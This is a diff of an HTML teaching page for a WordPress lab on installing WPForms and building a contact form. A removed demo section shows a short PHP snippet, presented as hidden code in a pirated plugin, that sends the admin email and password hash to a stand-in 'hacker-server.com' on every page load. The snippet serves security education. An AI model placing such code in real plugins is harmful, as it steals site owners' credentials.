@@ -1,791 +1,1096 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Week 10 Session 2 — Plugins & Contact Forms Demo</title>
-
-  <!--
-    FILES IN THIS PACKAGE:
-    ├── index.html    — this file: all 4 demo sections
-    ├── style.css     — all visual styles
-    └── script.js     — form validation + shortcode simulator + security demo
-
-    NOTE: This is a FRONT-END-ONLY demo.
-    It shows students what each WordPress feature LOOKS and FEELS like
-    before they build it in WordPress.
-  -->
+  <title>Week 10 Session 2 — Plugins & Contact Forms Step-by-Step Guide</title>
   <link rel="stylesheet" href="style.css" />
 </head>
-
 <body>
 
-  <!-- ============================================================
-    HEADER
-  ============================================================ -->
+  <!-- ============================================================  HEADER  -->
   <header class="site-header">
     <nav class="top-bar">
       <span class="site-logo">Week 10 · Session 2</span>
       <span class="week-label">Plugins &amp; Contact Forms</span>
     </nav>
     <hgroup class="hero-text">
-      <h1>Interactive Demo — All 4 Phases</h1>
-      <p>Phase 1: Plugins  ·  Phase 2: WPForms Builder  ·  Phase 3: Shortcodes  ·  Phase 4: Security</p>
+      <h1>Step-by-Step Lab Guide</h1>
+      <p>WPForms · Shortcodes · Contact Form · Security Plugin · Brute-Force Protection</p>
     </hgroup>
+    <div class="overall-progress-wrap">
+      <div class="overall-progress-label">
+        Overall Progress: <span id="overall-done">0</span> / <span id="overall-total">0</span> steps completed
+      </div>
+      <div class="overall-track"><div class="overall-fill" id="overall-fill"></div></div>
+    </div>
   </header>
 
-
-  <!-- ============================================================
-    PHASE NAV
-  ============================================================ -->
-  <nav class="phase-nav" aria-label="Jump to demo section">
-    <a href="#phase-1" class="phase-nav-link">Phase 1 · Plugins</a>
-    <a href="#phase-2" class="phase-nav-link">Phase 2 · Contact Form</a>
-    <a href="#phase-3" class="phase-nav-link">Phase 3 · Shortcode</a>
-    <a href="#phase-4" class="phase-nav-link">Phase 4 · Security</a>
+  <!-- ============================================================  NAV  -->
+  <nav class="phase-nav" aria-label="Jump to phase">
+    <a href="#prereq"   class="phase-nav-link">Before You Start</a>
+    <a href="#concept"  class="phase-nav-link">Theme vs Plugin</a>
+    <a href="#phase-1"  class="phase-nav-link">Phase 1 · Install WPForms</a>
+    <a href="#phase-2a" class="phase-nav-link">Phase 2a · Create Form</a>
+    <a href="#phase-2b" class="phase-nav-link">Phase 2b · Add Dropdown</a>
+    <a href="#phase-3"  class="phase-nav-link">Phase 3 · Shortcode Embed</a>
+    <a href="#phase-3t" class="phase-nav-link">Phase 3 · Test Form</a>
+    <a href="#phase-4"  class="phase-nav-link">Phase 4 · Security</a>
+    <a href="#audit"    class="phase-nav-link">Final Checklist</a>
   </nav>
 
-
-  <!-- ============================================================
-    MAIN
-  ============================================================ -->
+  <!-- ============================================================  MAIN  -->
   <main class="page-content">
 
 
-    <!-- ══════════════════════════════════════════════════════════
-      PHASE 1 · WHAT IS A PLUGIN?
-      Demonstrates: Theme vs Plugin, Plugin anatomy
-    ══════════════════════════════════════════════════════════════ -->
-    <section class="demo-section" id="phase-1">
-      <header class="section-header header-blue">
+    <!-- ══════ PREREQ ══════ -->
+    <section class="phase-section" id="prereq">
+      <header class="phase-header phase-gray">
+        <span class="phase-badge">Prerequisites</span>
+        <h2>Before You Start</h2>
+      </header>
+      <div class="phase-body">
+
+        <div class="concept-box concept-blue">
+          <div class="concept-title">📋 What you need from Week 10 Session 1</div>
+          <div class="checklist-inline">
+            <span class="ci-item">✅ XAMPP running (Apache + MySQL green)</span>
+            <span class="ci-item">✅ WordPress at http://localhost/mywebsite</span>
+            <span class="ci-item">✅ Astra theme installed and active</span>
+            <span class="ci-item">✅ Home, About Us, Contact pages published</span>
+            <span class="ci-item">✅ At least 4 posts with categories and featured images</span>
+          </div>
+        </div>
+
+        <ol class="step-list" data-phase="prereq">
+
+          <li class="step-item">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title">Start XAMPP — both Apache &amp; MySQL must be green</div>
+              <div class="step-desc">Open XAMPP Control Panel → click <strong>Start</strong> next to both Apache and MySQL.</div>
+              <div class="visual-mockup visual-dark">
+                <div class="mock-xampp-row"><span class="mx-service">Apache</span><span class="mx-status green">● Running</span><span class="mx-btn red">Stop</span><span class="mx-btn gray">Admin</span></div>
+                <div class="mock-xampp-row"><span class="mx-service">MySQL</span><span class="mx-status green">● Running</span><span class="mx-btn red">Stop</span><span class="mx-btn gray">Admin</span></div>
+              </div>
+              <div class="note note-red">⚠️ Do NOT continue until both are green.</div>
+            </div>
+          </li>
+
+          <li class="step-item">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title">Log in to WordPress Dashboard</div>
+              <div class="url-box">http://localhost/mywebsite/wp-admin</div>
+              <div class="creds-grid">
+                <div class="cred-row"><span class="cred-label">Username</span><code>admin</code></div>
+                <div class="cred-row"><span class="cred-label">Password</span><code>12345</code></div>
+              </div>
+              <div class="note note-green">✅ You should see the dark grey WordPress Dashboard.</div>
+            </div>
+          </li>
+
+        </ol>
+      </div>
+    </section>
+
+
+    <!-- ══════ CONCEPT: Theme vs Plugin ══════ -->
+    <section class="phase-section" id="concept">
+      <header class="phase-header phase-navy">
+        <span class="phase-badge">Key Concept</span>
+        <h2>Theme vs Plugin — The Critical Difference</h2>
+      </header>
+      <div class="phase-body">
+
+        <p class="phase-intro">
+          Before installing anything, understand the most important distinction in WordPress:
+        </p>
+
+        <div class="concept-split-box">
+          <div class="csb-col csb-blue">
+            <div class="csb-title">🎨 THEME — Controls How the Site LOOKS</div>
+            <ul class="csb-list">
+              <li>Changes fonts, colours, layout, spacing</li>
+              <li>Controls header, footer, and sidebar structure</li>
+              <li>Only ONE active theme at a time</li>
+              <li><strong>Session 1:</strong> We installed Astra</li>
+            </ul>
+          </div>
+          <div class="csb-arrow">+</div>
+          <div class="csb-col csb-green">
+            <div class="csb-title">🔌 PLUGIN — Controls What the Site DOES</div>
+            <ul class="csb-list">
+              <li>Adds new features and functionality</li>
+              <li>Contact forms, security, SEO, e-commerce</li>
+              <li>You can have MANY plugins active at once</li>
+              <li><strong>Today:</strong> WPForms + Security plugin</li>
+            </ul>
+          </div>
+        </div>
+
+        <!-- Security warning box -->
+        <div class="warning-box">
+          <div class="wb-title">⚠️ CRITICAL SECURITY RULE — Read Before Installing Anything</div>
+          <div class="wb-body">
+            <div class="wb-col wb-bad">
+              <strong>❌ NEVER do this:</strong>
+              <ul>
+                <li>Download plugins from random Google search results</li>
+                <li>Install "nulled" or "cracked" premium plugins</li>
+                <li>Get plugin ZIPs from Telegram groups</li>
+                <li>Download from any site other than wordpress.org</li>
+              </ul>
+              <div class="wb-reason">
+                Pirated plugins almost <em>always</em> contain hidden malware that silently
+                steals your admin password and sends it to a hacker's server.
+              </div>
+            </div>
+            <div class="wb-col wb-good">
+              <strong>✅ ALWAYS do this:</strong>
+              <ul>
+                <li>Install ONLY from the WordPress Dashboard</li>
+                <li>Use Plugins → Add New (official repository)</li>
+                <li>All 60,000+ plugins there are reviewed by WordPress</li>
+                <li>Check: 5-star rating + last updated recently</li>
+              </ul>
+              <div class="wb-reason">
+                The official repository is free, safe, and always up to date.
+                Every plugin in this session will be installed this way.
+              </div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+
+    <!-- ══════ PHASE 1 — Install WPForms ══════ -->
+    <section class="phase-section" id="phase-1">
+      <header class="phase-header phase-blue">
         <span class="phase-badge">Phase 1  ·  30 min</span>
-        <h2>Plugins — What They Are &amp; How They Work</h2>
+        <h2>Install &amp; Activate WPForms</h2>
       </header>
+      <div class="phase-body">
 
-      <div class="section-body">
-
-        <!-- ── 1A: Theme vs Plugin toggle demo ── -->
-        <article class="demo-card" id="demo-theme-vs-plugin">
-          <h3 class="demo-card-title">Demo 1A — Theme vs Plugin: Toggle to See the Difference</h3>
-          <p class="demo-desc">
-            A <strong>Theme</strong> controls how the site <em>looks</em>.
-            A <strong>Plugin</strong> controls what the site <em>does</em>.
-            Click the buttons below to swap themes — notice the content never changes,
-            only the visual presentation does.
+        <div class="concept-box concept-blue">
+          <div class="concept-title">🔌 What is WPForms?</div>
+          <p>
+            WPForms is the most popular WordPress form builder plugin with
+            <strong>6 million+ active installations</strong>.
+            It creates contact forms with drag-and-drop — <em>no HTML, CSS, JavaScript, or PHP needed</em>.
+            It handles everything your Week 6 form validation code did, plus PHP email sending, automatically.
           </p>
-
-          <!-- Theme switcher -->
-          <div class="theme-switcher" role="group" aria-label="Theme switcher demo">
-            <button class="theme-btn active" data-theme="default" onclick="switchTheme('default')">
-              Twenty Twenty-Four (Default)
-            </button>
-            <button class="theme-btn" data-theme="astra" onclick="switchTheme('astra')">
-              Astra Theme
-            </button>
-            <button class="theme-btn" data-theme="dark" onclick="switchTheme('dark')">
-              Dark News Theme
-            </button>
-          </div>
-
-          <!-- Live preview window that changes with the theme -->
-          <div class="site-preview" id="site-preview">
-            <div class="preview-header" id="preview-header">
-              <div class="preview-logo" id="preview-logo">TechWorld</div>
-              <nav class="preview-nav" id="preview-nav">
-                <span>Home</span><span>Blog</span><span>About</span><span>Contact</span>
-              </nav>
-            </div>
-            <div class="preview-hero" id="preview-hero">
-              <h2 id="preview-hero-title">Welcome to TechWorld</h2>
-              <p id="preview-hero-text">Your #1 source for tech news</p>
-              <button class="preview-cta" id="preview-cta">Read Our Blog</button>
-            </div>
-            <div class="preview-content" id="preview-content">
-              <article class="preview-post">
-                <div class="preview-post-img"></div>
-                <div class="preview-post-text">
-                  <strong>The Future of Quantum Computing</strong>
-                  <p>Category: Hardware</p>
-                </div>
-              </article>
-              <article class="preview-post">
-                <div class="preview-post-img"></div>
-                <div class="preview-post-text">
-                  <strong>Top 10 Programming Languages in 2025</strong>
-                  <p>Category: Software</p>
-                </div>
-              </article>
-            </div>
-          </div>
-
-          <p class="demo-note note-blue">
-            💡 <strong>Key takeaway:</strong> Both blog posts are still there after switching themes.
-            The DATABASE holds the content. The THEME controls the visual. They are completely separate.
-          </p>
-        </article>
-
-
-        <!-- ── 1B: Plugin anatomy ── -->
-        <article class="demo-card" id="demo-plugin-anatomy">
-          <h3 class="demo-card-title">Demo 1B — How a Plugin Adds a Menu Item</h3>
-          <p class="demo-desc">
-            When you <strong>Install &amp; Activate</strong> WPForms in WordPress,
-            it registers itself and adds a new item to the Dashboard left-hand menu.
-            This simulates what you will see:
-          </p>
-
-          <div class="plugin-install-demo">
-            <div class="pid-step pid-before">
-              <div class="pid-label">BEFORE installing WPForms</div>
-              <div class="mock-menu">
-                <div class="mm-item mm-active">Dashboard</div>
-                <div class="mm-item">Posts</div>
-                <div class="mm-item">Pages</div>
-                <div class="mm-item">Media</div>
-                <div class="mm-item">Appearance</div>
-                <div class="mm-item">Plugins</div>
-                <div class="mm-item">Settings</div>
-              </div>
-            </div>
-
-            <button class="install-plugin-btn" id="install-btn" onclick="simulateInstall()">
-              ▶ Install &amp; Activate WPForms
-            </button>
-
-            <div class="pid-step pid-after">
-              <div class="pid-label">AFTER activating WPForms</div>
-              <div class="mock-menu" id="menu-after">
-                <div class="mm-item mm-active">Dashboard</div>
-                <div class="mm-item">Posts</div>
-                <div class="mm-item">Pages</div>
-                <div class="mm-item">Media</div>
-                <div class="mm-item mm-new hidden" id="wpforms-menu-item">
-                  WPForms <span class="mm-new-badge">NEW!</span>
-                </div>
-                <div class="mm-item">Appearance</div>
-                <div class="mm-item">Plugins</div>
-                <div class="mm-item">Settings</div>
-              </div>
-            </div>
-          </div>
-
-          <p class="demo-note note-green" id="install-result" style="display:none;">
-            ✅ WPForms is now active! A new "WPForms" menu item appeared in the sidebar.
-            This is exactly what happens in your real WordPress Dashboard.
-          </p>
-        </article>
-
-
-        <!-- ── 1C: Security warning interactive ── -->
-        <article class="demo-card demo-danger" id="demo-security">
-          <h3 class="demo-card-title">Demo 1C — Plugin Security: Safe vs Dangerous Sources</h3>
-          <p class="demo-desc">
-            Click each installation source to see whether it is safe:
-          </p>
-
-          <div class="security-choices">
-            <button class="sc-btn sc-good"  onclick="checkSource('official')">
-              Install from WordPress Dashboard<br><small>(Plugins → Add New)</small>
-            </button>
-            <button class="sc-btn sc-bad"   onclick="checkSource('google')">
-              Download from a Google result<br><small>("free WPForms premium")</small>
-            </button>
-            <button class="sc-btn sc-bad"   onclick="checkSource('telegram')">
-              Get ZIP from Telegram group<br><small>("cracked plugins free")</small>
-            </button>
-            <button class="sc-btn sc-bad"   onclick="checkSource('pirate')">
-              Download "nulled" plugin<br><small>(pirated premium plugin)</small>
-            </button>
-          </div>
-
-          <div class="security-result" id="security-result" aria-live="polite"></div>
-
-          <!-- Hidden malware code reveal -->
-          <div class="malware-reveal hidden" id="malware-reveal">
-            <div class="mr-title">⚠️ Hidden code found inside the "free premium" plugin:</div>
-            <pre class="malware-code">
-<span class="mc-comment">// This code runs silently every time someone visits the site</span>
-<span class="mc-bad">add_action('wp_head', function() {</span>
-<span class="mc-bad">  @file_get_contents('https://hacker-server.com/steal.php?'</span>
-<span class="mc-bad">    . 'site=' . home_url()</span>
-<span class="mc-bad">    . '&user=' . get_option('admin_email')</span>
-<span class="mc-bad">    . '&pass=' . base64_encode(get_option('admin_password_hash'))</span>
-<span class="mc-bad">  );</span>
-<span class="mc-bad">});</span>
-<span class="mc-comment">// You will NEVER see this code. You will NEVER know it ran.</span></pre>
-          </div>
-        </article>
-
-      </div>
-    </section>
-
-
-    <!-- ══════════════════════════════════════════════════════════
-      PHASE 2 · CONTACT FORM BUILDER
-      Demonstrates: WPForms-style drag-and-drop form builder
-    ══════════════════════════════════════════════════════════════ -->
-    <section class="demo-section" id="phase-2">
-      <header class="section-header header-teal">
-        <span class="phase-badge">Phase 2  ·  45 min</span>
-        <h2>WPForms-Style Contact Form Builder</h2>
-      </header>
-
-      <div class="section-body">
-
-        <p class="phase-intro">
-          This demo simulates the WPForms drag-and-drop builder.
-          Toggle fields on/off to build your form, then see the live preview update instantly.
-        </p>
-
-        <div class="form-builder-layout">
-
-          <!-- Left: field panel -->
-          <aside class="field-panel">
-            <div class="fp-title">Available Fields</div>
-            <p class="fp-desc">Toggle each field to add or remove it from the form:</p>
-
-            <div class="field-toggle-list">
-
-              <label class="field-toggle ft-on">
-                <input type="checkbox" checked data-field="name" onchange="toggleField('name', this)">
-                <span class="ft-icon">T</span>
-                <div class="ft-info">
-                  <strong>Single Line Text</strong>
-                  <small>HTML: &lt;input type="text"&gt;</small>
-                </div>
-              </label>
-
-              <label class="field-toggle ft-on">
-                <input type="checkbox" checked data-field="email" onchange="toggleField('email', this)">
-                <span class="ft-icon">@</span>
-                <div class="ft-info">
-                  <strong>Email</strong>
-                  <small>HTML: &lt;input type="email"&gt;</small>
-                </div>
-              </label>
-
-              <label class="field-toggle">
-                <input type="checkbox" data-field="phone" onchange="toggleField('phone', this)">
-                <span class="ft-icon">#</span>
-                <div class="ft-info">
-                  <strong>Phone Number</strong>
-                  <small>HTML: &lt;input type="tel"&gt;</small>
-                </div>
-              </label>
-
-              <label class="field-toggle">
-                <input type="checkbox" data-field="subject" onchange="toggleField('subject', this)">
-                <span class="ft-icon">▾</span>
-                <div class="ft-info">
-                  <strong>Dropdown (Subject)</strong>
-                  <small>HTML: &lt;select&gt; + &lt;option&gt;</small>
-                </div>
-              </label>
-
-              <label class="field-toggle ft-on">
-                <input type="checkbox" checked data-field="message" onchange="toggleField('message', this)">
-                <span class="ft-icon">¶</span>
-                <div class="ft-info">
-                  <strong>Paragraph Text</strong>
-                  <small>HTML: &lt;textarea&gt;</small>
-                </div>
-              </label>
-
-              <label class="field-toggle">
-                <input type="checkbox" data-field="file" onchange="toggleField('file', this)">
-                <span class="ft-icon">📎</span>
-                <div class="ft-info">
-                  <strong>File Upload</strong>
-                  <small>HTML: &lt;input type="file"&gt;</small>
-                </div>
-              </label>
-
-              <label class="field-toggle">
-                <input type="checkbox" data-field="rating" onchange="toggleField('rating', this)">
-                <span class="ft-icon">★</span>
-                <div class="ft-info">
-                  <strong>Star Rating</strong>
-                  <small>Custom WPForms UI element</small>
-                </div>
-              </label>
-
-            </div>
-
-            <div class="fp-shortcode-box">
-              <div class="fp-sc-label">Your Shortcode:</div>
-              <code class="fp-sc-code" id="shortcode-preview">[wpforms id="1" title="false"]</code>
-              <button class="copy-sc-btn" onclick="copyShortcode()">Copy</button>
-            </div>
-          </aside>
-
-          <!-- Right: live form preview -->
-          <div class="form-preview-panel">
-            <div class="fpp-title">Live Form Preview</div>
-            <div class="fpp-subtitle">This is what students see on your Contact page:</div>
-
-            <form class="wp-form-preview" id="contact-form-preview" onsubmit="submitForm(event)" novalidate>
-
-              <!-- Name field -->
-              <div class="wf-field" id="field-name">
-                <label class="wf-label">
-                  Full Name <span class="wf-required">*</span>
-                </label>
-                <input
-                  type="text"
-                  class="wf-input"
-                  id="input-name"
-                  placeholder="e.g. Sokha Mony"
-                  autocomplete="off"
-                />
-                <div class="wf-error" id="err-name"></div>
-              </div>
-
-              <!-- Email field -->
-              <div class="wf-field" id="field-email">
-                <label class="wf-label">
-                  Email Address <span class="wf-required">*</span>
-                </label>
-                <input
-                  type="email"
-                  class="wf-input"
-                  id="input-email"
-                  placeholder="e.g. sokha@example.com"
-                  autocomplete="off"
-                />
-                <div class="wf-error" id="err-email"></div>
-              </div>
-
-              <!-- Phone field (hidden by default) -->
-              <div class="wf-field hidden" id="field-phone">
-                <label class="wf-label">Phone Number</label>
-                <input type="tel" class="wf-input" id="input-phone" placeholder="e.g. 012 345 678" />
-              </div>
-
-              <!-- Subject dropdown (hidden by default) -->
-              <div class="wf-field hidden" id="field-subject">
-                <label class="wf-label">
-                  Subject <span class="wf-required">*</span>
-                </label>
-                <select class="wf-select" id="input-subject">
-                  <option value="">— Select a subject —</option>
-                  <option value="general">General Inquiry</option>
-                  <option value="support">Support</option>
-                  <option value="sales">Sales</option>
-                </select>
-                <div class="wf-error" id="err-subject"></div>
-              </div>
-
-              <!-- Message field -->
-              <div class="wf-field" id="field-message">
-                <label class="wf-label">
-                  Message <span class="wf-required">*</span>
-                </label>
-                <textarea
-                  class="wf-textarea"
-                  id="input-message"
-                  rows="5"
-                  placeholder="Write your message here..."
-                ></textarea>
-                <div class="wf-error" id="err-message"></div>
-              </div>
-
-              <!-- File upload (hidden by default) -->
-              <div class="wf-field hidden" id="field-file">
-                <label class="wf-label">Attach a File (optional)</label>
-                <input type="file" class="wf-input" id="input-file" />
-              </div>
-
-              <!-- Star rating (hidden by default) -->
-              <div class="wf-field hidden" id="field-rating">
-                <label class="wf-label">How did you hear about us?</label>
-                <div class="star-rating" id="star-rating">
-                  <span class="star" data-val="1" onclick="setRating(1)">★</span>
-                  <span class="star" data-val="2" onclick="setRating(2)">★</span>
-                  <span class="star" data-val="3" onclick="setRating(3)">★</span>
-                  <span class="star" data-val="4" onclick="setRating(4)">★</span>
-                  <span class="star" data-val="5" onclick="setRating(5)">★</span>
-                </div>
-                <input type="hidden" id="input-rating" value="0" />
-              </div>
-
-              <button type="submit" class="wf-submit">Send Message</button>
-
-            </form>
-
-            <!-- Success message (shown after valid submit) -->
-            <div class="form-success hidden" id="form-success">
-              <div class="fs-icon">✓</div>
-              <div class="fs-title">Thanks for contacting us!</div>
-              <div class="fs-body">
-                We have received your message and will get back to you within 24 hours.
-                <br><br>
-                <strong>On localhost:</strong> No email is actually sent —
-                but in a real WordPress deployment, WPForms would email
-                you the submission automatically.
-              </div>
-              <button class="fs-reset" onclick="resetForm()">Send another message</button>
-            </div>
-
-          </div>
         </div>
 
-        <!-- Validation explainer -->
-        <div class="validation-explainer">
-          <div class="ve-title">How WPForms Validation Works — vs HTML/CSS/JS Week 6</div>
-          <div class="ve-comparison">
-            <div class="ve-col ve-html">
-              <div class="ve-label">Week 6 — You wrote this manually (~40 lines)</div>
-              <pre class="ve-code">
-<span class="vc-comment">// JavaScript you wrote in Week 6</span>
-<span class="vc-kw">function</span> <span class="vc-fn">validateForm</span>() {
-  <span class="vc-kw">const</span> email = document.getElementById(<span class="vc-str">'email'</span>).value;
-  <span class="vc-kw">const</span> emailRegex = <span class="vc-str">/^[^\s@]+@[^\s@]+\.[^\s@]+$/</span>;
-  <span class="vc-kw">if</span> (!emailRegex.test(email)) {
-    showError(<span class="vc-str">'Please enter a valid email'</span>);
-    <span class="vc-kw">return false</span>;
-  }
-  <span class="vc-comment">// ... 35 more lines for other fields ...</span>
+        <div class="comparison-box">
+          <div class="cb-col cb-red">
+            <div class="cb-label">Week 6 — You wrote ~50 lines of code</div>
+            <pre class="cb-code"><span class="cc-gray">// HTML form + CSS + JS validation</span>
+<span class="cc-red">&lt;form id="contact"&gt;
+  &lt;input type="email" id="email"&gt;
+  ...
+&lt;/form&gt;</span>
+<span class="cc-purple">function</span> <span class="cc-blue">validateForm</span>() {
+  <span class="cc-gray">// 40+ lines of JS validation...</span>
+  <span class="cc-gray">// No PHP email sending!</span>
 }</pre>
+          </div>
+          <div class="cb-arrow">→ WPForms replaces all this →</div>
+          <div class="cb-col cb-green">
+            <div class="cb-label">Today — Zero code, more features</div>
+            <ul style="font-size:.9rem;padding-left:1.2rem;margin-top:.4rem;">
+              <li>HTML form structure ✅ auto</li>
+              <li>CSS styling ✅ auto</li>
+              <li>JS validation ✅ auto</li>
+              <li>PHP email sending ✅ auto</li>
+              <li>Database storage ✅ auto</li>
+              <li>Spam protection ✅ auto</li>
+            </ul>
+          </div>
+        </div>
+
+        <ol class="step-list" data-phase="phase1">
+
+          <li class="step-item">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title">Go to Plugins → Add New Plugin</div>
+              <div class="step-desc">In the left WordPress menu, hover over <strong>Plugins</strong> → click <strong>Add New Plugin</strong>.</div>
+              <div class="nav-path">
+                <span class="np-item">Plugins</span><span class="np-arrow">→</span>
+                <span class="np-item np-active">Add New Plugin</span>
+              </div>
+              <div class="step-desc" style="margin-top:.5rem;">
+                You are now browsing the <strong>WordPress.org Plugin Repository</strong> — 60,000+ free, reviewed plugins.
+                Notice the download counts in the millions. Click the "Popular" tab to explore.
+              </div>
             </div>
-            <div class="ve-arrow">→</div>
-            <div class="ve-col ve-wp">
-              <div class="ve-label">WPForms — Zero code, same result</div>
-              <div class="ve-wp-steps">
-                <div class="vws-item">
-                  <span class="vws-num">1</span>
-                  <span>Drag field into builder</span>
-                </div>
-                <div class="vws-item">
-                  <span class="vws-num">2</span>
-                  <span>Toggle "Required" ON</span>
-                </div>
-                <div class="vws-item">
-                  <span class="vws-num">3</span>
-                  <span>For Email fields: validation is automatic</span>
-                </div>
-                <div class="vws-item">
-                  <span class="vws-num">4</span>
-                  <span>WPForms handles HTML + CSS + JS + PHP</span>
+          </li>
+
+          <li class="step-item">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title">Search for "WPForms" in the search bar</div>
+              <div class="step-desc">Find the search input in the top-right area of the page. Type: <code>WPForms</code></div>
+              <div class="step-desc" style="margin-top:.4rem;">
+                The <strong>WPForms Lite</strong> plugin appears — look for:
+              </div>
+              <ul class="sub-steps">
+                <li>Blue "WP" logo icon</li>
+                <li>"By WPForms" under the title</li>
+                <li>6,000,000+ active installations</li>
+                <li>5-star rating</li>
+              </ul>
+              <div class="note note-red">
+                ⚠️ Make sure you click the correct plugin — "WPForms" not "WP Forms" or similar fake plugins.
+              </div>
+            </div>
+          </li>
+
+          <li class="step-item step-important">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title"><span class="badge-important">★ KEY STEP</span> Click "Install Now"</div>
+              <ol class="sub-steps">
+                <li>Hover your mouse over the WPForms card</li>
+                <li>An <strong>Install Now</strong> button appears</li>
+                <li>Click <strong>Install Now</strong></li>
+                <li>WordPress downloads WPForms from the repository — wait about 15 seconds</li>
+                <li>A progress bar and then a checkmark appears when done</li>
+              </ol>
+              <div class="note note-blue">
+                💡 Installing only downloads the plugin files to your server. The plugin is NOT active yet — it is just ready to be turned on.
+              </div>
+            </div>
+          </li>
+
+          <li class="step-item step-important">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title"><span class="badge-important">★ KEY STEP</span> Click "Activate"</div>
+              <div class="step-desc">After installation, the button changes from "Install Now" to two options:</div>
+              <ol class="sub-steps">
+                <li>Click <strong>Activate</strong> (not "Live Preview")</li>
+                <li>WordPress activates WPForms immediately</li>
+                <li>You are redirected back to the Plugins page</li>
+              </ol>
+              <div class="note note-green">✅ WPForms is now active! Look at the left sidebar — a new <strong>WPForms</strong> menu item has appeared. This is exactly how every plugin works.</div>
+            </div>
+          </li>
+
+          <li class="step-item">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title">Notice the new WPForms menu item in the sidebar</div>
+              <div class="step-desc">
+                Look at the left-hand WordPress navigation menu.
+                You will see a new <strong>WPForms</strong> item that was NOT there before.
+                This is how plugins extend WordPress — they register their own menu items, settings pages, and database tables.
+              </div>
+              <div class="visual-mockup visual-dark" style="max-width:220px;">
+                <div class="mock-menu-preview">
+                  <div class="mmp-item">Dashboard</div>
+                  <div class="mmp-item">Posts</div>
+                  <div class="mmp-item">Pages</div>
+                  <div class="mmp-item mmp-new">WPForms <span class="mmp-badge">NEW!</span></div>
+                  <div class="mmp-item">Appearance</div>
+                  <div class="mmp-item">Plugins</div>
+                  <div class="mmp-item">Settings</div>
                 </div>
               </div>
+            </div>
+          </li>
+
+        </ol>
+      </div>
+    </section>
+
+
+    <!-- ══════ PHASE 2a — Create the Form ══════ -->
+    <section class="phase-section" id="phase-2a">
+      <header class="phase-header phase-teal">
+        <span class="phase-badge">Phase 2  ·  45 min</span>
+        <h2>Build the Contact Form — Part 1: Create &amp; Name the Form</h2>
+        <span class="phase-time">Part 1 of 2</span>
+      </header>
+      <div class="phase-body">
+
+        <p class="phase-intro">
+          WPForms has a visual drag-and-drop form builder. You will create a form,
+          use a pre-built template, and explore the existing fields.
+        </p>
+
+        <ol class="step-list" data-phase="phase2a">
+
+          <li class="step-item">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title">Open WPForms → click "Add New"</div>
+              <div class="step-desc">Click <strong>WPForms</strong> in the left menu → click <strong>Add New</strong>.</div>
+              <div class="nav-path">
+                <span class="np-item">WPForms</span><span class="np-arrow">→</span>
+                <span class="np-item np-active">Add New</span>
+              </div>
+              <div class="step-desc" style="margin-top:.5rem;">The WPForms builder page opens. You will see a field for the form name and template cards below it.</div>
+            </div>
+          </li>
+
+          <li class="step-item">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title">Name your form "Main Contact Form"</div>
+              <div class="step-desc">At the top of the page, find the <strong>"Name Your Form"</strong> field.</div>
+              <ol class="sub-steps">
+                <li>Click inside the name field</li>
+                <li>Delete any existing placeholder text</li>
+                <li>Type exactly: <code>Main Contact Form</code></li>
+              </ol>
+              <div class="note note-blue">💡 The name is for your own reference inside the Dashboard — visitors never see it. Choose a name that describes the form's purpose.</div>
+            </div>
+          </li>
+
+          <li class="step-item step-important">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title"><span class="badge-important">★ KEY STEP</span> Select the "Simple Contact Form" template</div>
+              <div class="step-desc">Below the name field, you see template cards. Find <strong>Simple Contact Form</strong>:</div>
+              <ol class="sub-steps">
+                <li>Look for the card labelled <strong>"Simple Contact Form"</strong></li>
+                <li>Hover over it — a <strong>Use Template</strong> button appears</li>
+                <li>Click <strong>Use Template</strong></li>
+              </ol>
+              <div class="step-desc" style="margin-top:.6rem;">
+                The WPForms <strong>drag-and-drop builder</strong> opens. You will see:
+              </div>
+              <ul class="sub-steps">
+                <li><strong>Left panel:</strong> Available field types (Add Fields)</li>
+                <li><strong>Right/centre:</strong> The form preview with pre-built fields</li>
+                <li><strong>Top toolbar:</strong> Save button and settings tabs</li>
+              </ul>
+              <div class="note note-green">✅ The template already created 3 fields for you: Name, Email, and Comment/Message.</div>
+            </div>
+          </li>
+
+          <li class="step-item">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title">Explore the 3 pre-built fields</div>
+              <div class="step-desc">Look at the form preview on the right side. You should see these fields:</div>
+
+              <div class="field-reference">
+                <div class="fr-row">
+                  <div class="fr-field">Name</div>
+                  <div class="fr-html"><code>&lt;input type="text"&gt;</code></div>
+                  <div class="fr-desc">Free text — Name field, accepts anything</div>
+                </div>
+                <div class="fr-row">
+                  <div class="fr-field">Email</div>
+                  <div class="fr-html"><code>&lt;input type="email"&gt;</code></div>
+                  <div class="fr-desc">Auto-validates format — must have @ and domain</div>
+                </div>
+                <div class="fr-row">
+                  <div class="fr-field">Comment / Message</div>
+                  <div class="fr-html"><code>&lt;textarea&gt;</code></div>
+                  <div class="fr-desc">Multi-line text — for the message body</div>
+                </div>
+              </div>
+
+              <div class="note note-blue">💡 Try clicking on any field in the preview — a settings panel opens on the left showing options like Label, Required toggle, Placeholder text, etc.</div>
+            </div>
+          </li>
+
+          <li class="step-item step-important">
+            <button class="step-check" aria-label="Mark complete">☐</button>
+            <div class="step-content">
+              <div class="step-title"><span class="badge-important">★ SAVE</span> Click Save to save the form</div>
+              <div class="step-desc">Find the orange <strong>Save</strong> button in the top-right corner of the builder.</div>
+              <ol class="sub-steps">
+                <li>Click <strong>Save</strong></li>
+                <li>A small "Saved" confirmation appears briefly</li>
+              </ol>
+              <div class="note note-red">⚠️ Always save before leaving the builder — unsaved changes are lost if you close the tab!</div>
+            </div>
+          </li>
+
+        </ol>
